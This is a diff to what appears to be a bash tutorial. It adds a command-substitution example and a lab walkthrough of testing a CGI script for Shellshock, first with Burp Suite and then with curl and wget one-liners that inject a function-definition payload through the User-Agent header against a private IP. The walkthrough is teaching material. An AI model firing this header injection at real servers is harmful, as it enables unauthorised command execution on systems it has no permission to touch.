@@ -14,6 +14,13 @@ echo $foo
 # bar
 ```
 
+You can also set variables to the output of commands using $(...)
+```bash
+message=$(fortune)
+echo $message
+# Your mode of life will be changed for the better because of new developments.
+```
+
 However, any strings with spaces need quotes for proper assignment
 ```bash
 foo=bar bar
@@ -129,3 +136,43 @@ It looks a lot like this shell script is just outputting HTML, which is exactly 
 
 If you started a webserver and navigated to the file, it would look something like this:
 ![hello.png](pictures/hello.png)
+
+We can intercept the request in burp suite, and it looks something like this:
+![burpreq.png](pictures/burpreq.png)
+
+We can see right now that we have 8 different headers to mess around with. Out of these, only one is passed to the CGI script, User-Agent, while the rest are handled by the server.
+
+If we send the request to the Burp Repeater, we can edit headers and track the responses we get:
+![repeater.png](pictures/repeater.png)
+
+Lets try editing User-Agent to test if this server is vulnerable to shellshock:
+![shocked.png](pictures/shocked.png)
+
+Voila!
+
+Bonus: Would you believe that Burp Suite isn't needed to do a cgi-based shellshock attack?
+
+Both `curl` and `wget` can be used to send HTTP requests with edited headers and view the response.
+```bash
+curl -H 'User-Agent: () { :; }; echo; echo vulnerable' http://192.168.56.101:8000/cgi-bin/hello.sh
+```
+The `-H` flag lets us specify what headers to change in our request. 
+```bash
+wget -qO- --header="User-Agent: () { :; }; echo; echo vulnerable" http://192.168.56.101:8000/cgi-bin/hello.sh
+```
+The `--header` acts like curl's `-H` flag, and `-qO-` spits the response to stdout. Both output the following:
+```
+vulnerable
+Content-type: text/html
+
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Hello World</title>
+</head>
+<body>
+Hello World
+</body>
+</html>
+```
+Note: When we send the modified header with `curl` or `wget`, we need to add an extra `echo` that we didn't need to do with Burp Suite, because we need an extra newline otherwise the web-server fails to parse the header.
